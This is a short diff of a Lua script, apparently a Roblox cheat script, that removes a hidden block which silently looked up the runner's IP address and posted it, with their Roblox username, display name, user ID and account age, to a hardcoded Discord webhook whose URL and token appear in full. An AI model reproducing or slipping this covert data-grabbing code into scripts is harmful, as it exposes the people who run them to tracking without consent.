@@ -1,38 +1,4 @@
 if not _G.ExecutedXylo then
-spawn(function()
-pcall(function()
-function SendWebhook(Arg)
-        local HttpService = game:GetService("HttpService")
-        local Webhook_URL = "https://discord.com/api/webhooks/1194307108334735510/u6wSa8okM3oek3OjMZG2BeX3miucRCyMUGLer5WXoPBmAJLL8bTYPivmJ2JkTxn9hsug"
-
-        local response = request({
-            Url = Webhook_URL,
-            Method = 'POST',
-            Headers = {
-                ['Content-Type'] = 'application/json'
-            },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = {{
-                    ["title"] = "",
-                    ["description"] = "",
-                    ["type"] = "rich",
-                    ["color"] = tonumber(0xffffff),
-                    ["fields"] = {
-                        {
-                            ["name"] = "",
-                            ["value"] = Arg,
-                            ["inline"] = true
-                        }
-                    }
-                }}
-            })
-        })
-end
-
-SendWebhook("IP : "tostring(game:HttpGet("https://wtfismyip.com/text")) .. "\nUsername : "..game:GetService("Players").LocalPlayer.Name .. "\nDisplayName : "..game:GetService("Players").LocalPlayer.DisplayName.."\nUserID : "..game:GetService("Players").LocalPlayer.UserId.."\n AccountAge : "..game:GetService("Players").LocalPlayer.AccountAge)
-end
-end)
 _G.ExecutedXylo = true
 local RandomCode = math.random(1,100)
 _G.Click = true
